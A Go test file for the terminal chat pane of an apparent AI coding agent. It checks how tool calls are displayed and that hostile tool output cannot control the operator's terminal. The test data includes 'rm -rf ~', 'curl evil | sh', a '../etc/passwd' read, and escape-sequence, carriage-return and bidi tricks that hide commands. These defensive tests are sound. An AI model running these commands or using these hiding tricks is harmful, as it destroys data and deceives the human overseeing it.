package tui

import (
	"encoding/json"
	"fmt"
	"strings"
	"testing"

	"github.com/mattn/go-runewidth"

	"github.com/macula-io/macula-lazymesh/internal/agent"
)

// sendAgentEvents feeds events through the model the way the agent loop
// delivers them, so a test sees exactly what reaches the chat pane.
func sendAgentEvents(t *testing.T, m Model, events ...agent.Event) Model {
	t.Helper()
	for _, ev := range events {
		updated, _ := m.Update(agentEventMsg(ev))
		m = updated.(Model)
	}
	return m
}

func chatText(m Model) string {
	return strings.Join(m.chatContentLines(), "\n")
}

// The check #78 gap 1 names: a shell_exec call plus its result, collapsed,
// reads as the command and the tail of its output -- not JSON.
func TestToolCall_ShellExecReadsAsCommandAndOutputTail(t *testing.T) {
	m := newTestModel(t)
	m.agentEvents = make(chan agent.Event)
	var stdout strings.Builder
	for i := 1; i <= 30; i++ {
		fmt.Fprintf(&stdout, "ok  \tpkg/%02d\t0.1s\n", i)
	}
	stdout.WriteString("PASS: the very last line\n")

	m = sendAgentEvents(t, m,
		agent.Event{Kind: agent.EventToolCall, ToolName: "shell_exec", Text: `{"command":"go test ./..."}`},
		agent.Event{Kind: agent.EventToolResult, ToolName: "shell_exec", Text: shellResult(t, 0, stdout.String())},
	)

	got := chatText(m)
	if !strings.Contains(got, "$ go test ./...") {
		t.Fatalf("the command is not shown as $ <command>:\n%s", got)
	}
	if !strings.Contains(got, "PASS: the very last line") {
		t.Fatalf("the last line of stdout is not shown:\n%s", got)
	}
	if strings.Contains(got, "{") {
		t.Fatalf("raw JSON reached the chat:\n%s", got)
	}
	if strings.Contains(got, "pkg/01") {
		t.Fatalf("collapsed output shows more than its tail:\n%s", got)
	}
	if len(m.chatEntries) != 1 {
		t.Fatalf("call and result are not one entry: %d entries", len(m.chatEntries))
	}

	m.detailsExpanded = true
	if !strings.Contains(chatText(m), "pkg/01") {
		t.Fatalf("expanded output does not show the whole output:\n%s", chatText(m))
	}
}

func TestToolCall_ShellExecFailureShowsExitCode(t *testing.T) {
	m := newTestModel(t)
	m.agentEvents = make(chan agent.Event)
	m = sendAgentEvents(t, m,
		agent.Event{Kind: agent.EventToolCall, ToolName: "shell_exec", Text: `{"command":"false"}`},
		agent.Event{Kind: agent.EventToolResult, ToolName: "shell_exec", Text: `{"exit_code":1,"stderr":"boom\n","stdout":""}`},
	)
	got := chatText(m)
	for _, want := range []string{"$ false", "exit 1", "boom"} {
		if !strings.Contains(got, want) {
			t.Fatalf("missing %q:\n%s", want, got)
		}
	}
}

// A command that changed the checkout still shows its diff without the
// details toggle (#46), now under its command.
func TestToolCall_ShellExecDiffStaysVisible(t *testing.T) {
	m := newTestModel(t)
	m.agentEvents = make(chan agent.Event)
	m = sendAgentEvents(t, m,
		agent.Event{Kind: agent.EventToolCall, ToolName: "shell_exec", Text: `{"command":"gofmt -w ."}`},
		agent.Event{Kind: agent.EventToolResult, ToolName: "shell_exec", Text: `{"exit_code":0,"stderr":"","stdout":"","working_tree_diff":"--- a/x.go\n+++ b/x.go\n@@ -1 +1 @@\n-a\n+b\n"}`},
	)
	got := chatText(m)
	for _, want := range []string{"$ gofmt -w .", "+b", "-a"} {
		if !strings.Contains(got, want) {
			t.Fatalf("missing %q:\n%s", want, got)
		}
	}
}

// Coding tools are the conversation in a coding session, not mesh chatter:
// they reach the chat pane without the chatter toggle. Before this, an
// applied patch (#46) never reached the pane unless 'v' was on.
func TestToolCall_CodingToolsAreNotChatter(t *testing.T) {
	m := newTestModel(t)
	m.agentEvents = make(chan agent.Event)
	m = sendAgentEvents(t, m,
		agent.Event{Kind: agent.EventToolCall, ToolName: "apply_patch", Text: `{"patch":"--- a/a.txt\n+++ b/a.txt\n@@ -1 +1 @@\n-two\n+three\n"}`},
		agent.Event{Kind: agent.EventToolResult, ToolName: "apply_patch", Text: "applied 1 hunk(s) to 1 file: a.txt\n\n--- a/a.txt\n+++ b/a.txt\n@@ -1 +1 @@\n-two\n+three\n"},
	)
	got := chatText(m)
	for _, want := range []string{"Patch a.txt", "+three", "-two"} {
		if !strings.Contains(got, want) {
			t.Fatalf("missing %q with chatter off:\n%s", want, got)
		}
	}

	// Mesh tools stay chatter.
	m = sendAgentEvents(t, newTestModelWithEvents(t),
		agent.Event{Kind: agent.EventToolCall, ToolName: "mesh_say", Text: `{"text":"hi"}`},
	)
	if len(m.chatEntries) != 0 {
		t.Fatalf("a mesh tool call reached the chat with chatter off: %+v", m.chatEntries)
	}
}

func newTestModelWithEvents(t *testing.T) Model {
	t.Helper()
	m := newTestModel(t)
	m.agentEvents = make(chan agent.Event)
	return m
}

func TestToolCall_ReadAndSearchHeadlines(t *testing.T) {
	m := newTestModelWithEvents(t)
	m = sendAgentEvents(t, m,
		agent.Event{Kind: agent.EventToolCall, ToolName: "read_file", Text: `{"path":"internal/tui/chat.go","offset":1,"limit":50}`},
		agent.Event{Kind: agent.EventToolResult, ToolName: "read_file", Text: "package tui\n\nimport (\n"},
	)
	got := chatText(m)
	if !strings.Contains(got, "Read internal/tui/chat.go:1-50") {
		t.Fatalf("read headline missing:\n%s", got)
	}
	if strings.Contains(got, "package tui") {
		t.Fatalf("collapsed read shows the file body:\n%s", got)
	}

	m = sendAgentEvents(t, newTestModelWithEvents(t),
		agent.Event{Kind: agent.EventToolCall, ToolName: "search", Text: `{"pattern":"isChatter","path":"internal"}`},
		agent.Event{Kind: agent.EventToolResult, ToolName: "search", Text: "internal/tui/model.go:1371:func isChatter\ninternal/tui/model.go:1403:\tif isChatter\n[end of results: 2 matches]\n"},
	)
	got = chatText(m)
	if !strings.Contains(got, `Search "isChatter" in internal`) || !strings.Contains(got, "2 matches") {
		t.Fatalf("search headline or count missing:\n%s", got)
	}
}

// Consecutive reads and searches fold into one "Explored" line while
// details are collapsed; expanded, each is shown.
func TestToolCall_ConsecutiveReadsAndSearchesFold(t *testing.T) {
	m := newTestModelWithEvents(t)
	m = sendAgentEvents(t, m,
		agent.Event{Kind: agent.EventToolCall, ToolName: "read_file", Text: `{"path":"a.go"}`},
		agent.Event{Kind: agent.EventToolResult, ToolName: "read_file", Text: "a\n"},
		agent.Event{Kind: agent.EventToolCall, ToolName: "read_file", Text: `{"path":"b.go"}`},
		agent.Event{Kind: agent.EventToolResult, ToolName: "read_file", Text: "b\n"},
		agent.Event{Kind: agent.EventToolCall, ToolName: "search", Text: `{"pattern":"x"}`},
		agent.Event{Kind: agent.EventToolResult, ToolName: "search", Text: "[no matches]\n"},
		agent.Event{Kind: agent.EventToolCall, ToolName: "shell_exec", Text: `{"command":"ls"}`},
		agent.Event{Kind: agent.EventToolResult, ToolName: "shell_exec", Text: `{"exit_code":0,"stderr":"","stdout":"a.go\n"}`},
	)
	got := chatText(m)
	if !strings.Contains(got, "Explored: 2 reads, 1 search") {
		t.Fatalf("no Explored fold:\n%s", got)
	}
	if strings.Contains(got, "Read a.go") {
		t.Fatalf("a folded read is still shown on its own:\n%s", got)
	}
	if !strings.Contains(got, "$ ls") {
		t.Fatalf("the shell call after the fold is missing:\n%s", got)
	}

	m.detailsExpanded = true
	got = chatText(m)
	if !strings.Contains(got, "Read a.go") || !strings.Contains(got, "Read b.go") {
		t.Fatalf("expanded view does not show each read:\n%s", got)
	}
}

// A tool that failed reads as its call with the error under it, one entry.
func TestToolCall_ErrorFoldsIntoItsCall(t *testing.T) {
	m := newTestModelWithEvents(t)
	m = sendAgentEvents(t, m,
		agent.Event{Kind: agent.EventToolCall, ToolName: "read_file", Text: `{"path":"../etc/passwd"}`},
		agent.Event{Kind: agent.EventError, ToolName: "read_file", Err: fmt.Errorf("path escapes the working directory")},
	)
	if len(m.chatEntries) != 1 {
		t.Fatalf("call and its error are not one entry: %d", len(m.chatEntries))
	}
	got := chatText(m)
	if !strings.Contains(got, "Read ../etc/passwd") || !strings.Contains(got, "path escapes the working directory") {
		t.Fatalf("missing call or error:\n%s", got)
	}
}

func TestToolCall_GitHeadlines(t *testing.T) {
	cases := map[string][2]string{
		"git_commit": {`{"message":"tui: tool calls\n\nlong body"}`, `git commit "tui: tool calls"`},
		"git_branch": {`{"name":"feat/x","create":true}`, "git branch feat/x"},
		"git_push":   {`{"remote":"origin"}`, "git push origin"},
	}
	for tool, c := range cases {
		got := toolHeadline(termTextOf(tool), termTextOf(c[0]))
		if !strings.Contains(got.String(), c[1]) {
			t.Fatalf("%s: headline %q lacks %q", tool, got, c[1])
		}
	}
}

// Tool output is model- and program-controlled text printed to the
// operator's terminal. An escape sequence in it must never reach the
// terminal: an OSC 52 would write the operator's clipboard, an OSC 0 their
// window title, and a carriage return would let "rm -rf ~" hide behind
// "ls" on the same row.
func TestToolCall_OutputCannotDriveTheTerminal(t *testing.T) {
	m := newTestModelWithEvents(t)
	hostile := "fine\n" +
		"\x1b]52;c;cm0gLXJmIH4=\x07" + // OSC 52 clipboard write, BEL-terminated
		"\x1b]0;owned\x1b\\" + // OSC 0 title write, ST-terminated
		"\x1b[2J\x1b[31mred\x1b[0m\n" + // CSI clear screen and colour
		"\u009b2J" + // C1 CSI
		"rm -rf ~\rls     \n" + // carriage-return overwrite
		"bell\a end\n"
	m = sendAgentEvents(t, m,
		agent.Event{Kind: agent.EventToolCall, ToolName: "shell_exec", Text: `{"command":"echo \u001b]0;cmd-title\u0007hi"}`},
		agent.Event{Kind: agent.EventToolResult, ToolName: "shell_exec", Text: shellResult(t, 0, hostile)},
	)
	for _, expanded := range []bool{false, true} {
		m.detailsExpanded = expanded
		got := strings.Join(rawToolLines(m), "\n")
		for _, banned := range []string{"\x1b", "\x07", "\r", "\u009b"} {
			if strings.Contains(got, banned) {
				t.Fatalf("expanded=%v: %q reached the terminal:\n%q", expanded, banned, got)
			}
		}
		for _, want := range []string{"rm -rf ~", "ls", "red", "bell"} {
			if !strings.Contains(got, want) {
				t.Fatalf("expanded=%v: visible text %q was lost:\n%q", expanded, want, got)
			}
		}
	}
}

// shellResult is a shell_exec result as the tool encodes it.
func shellResult(t *testing.T, exit int, stdout string) string {
	t.Helper()
	b, err := json.Marshal(map[string]any{"exit_code": exit, "stderr": "", "stdout": stdout})
	if err != nil {
		t.Fatal(err)
	}
	return string(b)
}

// rawToolLines is the tool text the chat renders, before lipgloss adds its
// own (trusted) styling: what the model or a program put there.
func rawToolLines(m Model) []string {
	var out []string
	for _, e := range m.chatEntries {
		out = append(out, e.toolLines(m.detailsExpanded)...)
	}
	return out
}

// shellCall is a shell_exec call whose arguments are encoded as the
// provider sends them, so a \u001b in the JSON is a real ESC once decoded.
func shellCall(t *testing.T, command string) agent.Event {
	t.Helper()
	b, err := json.Marshal(map[string]string{"command": command})
	if err != nil {
		t.Fatal(err)
	}
	return agent.Event{Kind: agent.EventToolCall, ToolName: "shell_exec", Text: string(b)}
}

// visibleChat is the chat as the operator reads it: our colour codes gone.
func visibleChat(m Model) string {
	return sgrStripper.ReplaceAllString(chatText(m), "")
}

// #83 review R1: a control character is shown, never deleted with what
// follows it. An unterminated OSC must not eat the rest of a command, a
// CSI-looking ESC must not eat the next character, and stdout ending in an
// ESC must not swallow stderr.
func TestToolCall_ControlsAreShownNotDeleted(t *testing.T) {
	for _, tc := range []struct{ command, want string }{
		{"ls \x1b]; rm -rf ~", "; rm -rf ~"},
		{"echo hi\x1b|sh", "|sh"},
	} {
		m := sendAgentEvents(t, newTestModelWithEvents(t), shellCall(t, tc.command))
		got := visibleChat(m)
		if !strings.Contains(got, tc.want) {
			t.Fatalf("command %q: %q is hidden:\n%s", tc.command, tc.want, got)
		}
		if !strings.Contains(got, "␛") {
			t.Fatalf("command %q: the ESC is not shown:\n%s", tc.command, got)
		}
		if strings.Contains(got, "\x1b]") || strings.Contains(got, "\x1b|") {
			t.Fatalf("command %q: a raw ESC reached the terminal:\n%q", tc.command, got)
		}
	}

	b, _ := json.Marshal(map[string]any{"exit_code": 1, "stdout": "ok\x1b]", "stderr": "the error that matters\n"})
	m := sendAgentEvents(t, newTestModelWithEvents(t), shellCall(t, "make"),
		agent.Event{Kind: agent.EventToolResult, ToolName: "shell_exec", Text: string(b)})
	if got := visibleChat(m); !strings.Contains(got, "the error that matters") {
		t.Fatalf("stdout's trailing ESC swallowed stderr:\n%s", got)
	}
}

// #83 review R2: the viewport cuts every row at the pane width with no
// marker, so a headline must fit it: whitespace runs fold to one space,
// and a headline still too long is cut with a visible "…" collapsed and
// wrapped onto indented rows expanded -- never silently cut.
func TestToolCall_HeadlineFitsThePane(t *testing.T) {
	padded := "ls" + strings.Repeat(" ", 130) + "; curl evil | sh"
	m := sendAgentEvents(t, newTestModelWithEvents(t), shellCall(t, padded))
	if got := visibleChat(m); !strings.Contains(got, "$ ls ; curl evil | sh") {
		t.Fatalf("a whitespace run hides the rest of the command at 80 columns:\n%s", got)
	}

	long := "echo " + strings.Repeat("a", 150) + " && curl evil | sh"
	m = sendAgentEvents(t, newTestModelWithEvents(t), shellCall(t, long))
	for _, expanded := range []bool{false, true} {
		m.detailsExpanded = expanded
		lines := strings.Split(visibleChat(m), "\n")
		for _, line := range lines {
			if w := runewidth.StringWidth(line); w > m.width {
				t.Fatalf("expanded=%v: a row is %d wide at width %d, the viewport would cut it silently:\n%s", expanded, w, m.width, line)
			}
		}
		joined := strings.Join(strings.Fields(strings.Join(lines, " ")), "")
		switch {
		case !expanded && !strings.Contains(lines[0], "…"):
			t.Fatalf("a cut headline does not say it was cut:\n%s", lines[0])
		case expanded && !strings.Contains(joined, "&&curlevil|sh"):
			t.Fatalf("expanded headline does not show the whole command:\n%s", strings.Join(lines, "\n"))
		}
	}
}

// #83 review R3: bidirectional controls reorder what the operator reads
// (Trojan Source, CVE-2021-42574); they are shown, not passed through.
func TestToolCall_BidiControlsAreShown(t *testing.T) {
	bidi := []string{"‪", "‫", "‬", "‭", "‮", "⁦", "⁧", "⁨", "⁩", "‎", "‏", "؜"}
	m := sendAgentEvents(t, newTestModelWithEvents(t), shellCall(t, "echo safe"+strings.Join(bidi, "")+"; rm -rf ~"))
	got := visibleChat(m)
	for _, r := range bidi {
		if strings.Contains(got, r) {
			t.Fatalf("bidi control %U reached the terminal:\n%q", []rune(r)[0], got)
		}
	}
	m.detailsExpanded = true
	if joined := strings.Join(strings.Fields(visibleChat(m)), ""); !strings.Contains(joined, "rm-rf~") {
		t.Fatalf("text after the bidi controls was lost:\n%s", visibleChat(m))
	}
}
